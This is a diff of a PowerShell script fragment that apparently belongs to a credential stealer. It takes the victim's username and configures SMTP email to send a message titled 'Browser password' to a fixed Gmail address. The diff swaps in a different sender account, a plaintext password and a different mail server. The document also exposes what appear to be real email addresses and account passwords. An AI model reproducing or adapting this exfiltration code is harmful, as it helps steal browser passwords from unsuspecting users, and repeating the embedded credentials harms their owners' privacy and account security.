@@ -1,11 +1,11 @@
 $username=$env:Username
 
-$From = "sabinprashant013@outlook.com"
-$Pass = "appreciation123"
+$From = "alexblake15@tutanota.com"
+$Pass = "iloveacdc123"
 $To = "sabinshrestha15@gmail.com"
 $Subject = "Browser password"
 $Body = $username
-$SMTPServer = "smtp.outlook.com"
+$SMTPServer = "smtp.tutanota.com"
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
